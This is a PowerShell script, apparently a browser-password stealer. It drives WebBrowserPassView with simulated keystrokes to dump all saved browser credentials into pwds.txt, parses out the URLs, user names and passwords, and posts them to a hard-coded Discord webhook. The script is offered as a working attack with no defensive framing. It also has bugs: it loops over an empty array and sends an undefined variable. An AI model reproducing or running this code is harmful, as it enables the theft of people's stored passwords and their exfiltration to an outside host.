$URL = "https://discordapp.com/api/webhooks/1276442521689395220/CnXvgEAYbwkbYIOC1ZOkG_wmf-2my3mRSQv7Xip6WM3FCRfrjYOctTAe3FKtI8uEs9HS"
$groupedData = @()
$discordMessage = ""
$extractedData = @()
$fields = @("URL", "User Name", "Password")

$wshell = New-Object -ComObject wscript.shell;
$wshell.AppActivate('WebBrowserPassView')
Sleep 1
$wshell.SendKeys("^{a}")
Sleep 1
$wshell.SendKeys("^{s}")
Sleep 1
$wshell.SendKeys("pwds.txt")
Sleep 1
$wshell.SendKeys("~")
Sleep 2

# Read the file content and extract the relevant fields
foreach ($field in $fields) {
    # Use Select-String to match the lines that start with the field name
    $matches = Select-String -Path pwds.txt -Pattern "^\s*$field\s*:\s*(.+)" | ForEach-Object {
        $_.Matches.Groups[1].Value.Trim()
    }

    # Add the extracted data to the array
    $extractedData += $matches
}

foreach ($entry in $groupedData) {
    $discordMessage += "`nURL: $($entry.URL)`nUser Name: $($entry.UserName)`nPassword: $($entry.Password)`n"
}

# Truncate if content exceeds Discord's 2000 character limit
if ($discordMessage.Length -gt 2000) {
    Write-Host "Content exceeds the 2000 character limit, truncating..."
    $discordMessage = $discordMessage.Substring(0, 2000)
}

$msg = @{
    content = $PassContent
} | ConvertTo-Json

try {
    Invoke-RestMethod -Uri $URL -Method Post -Body $msg -ContentType "application/json" -ErrorAction Stop | Out-Null
} catch {
}
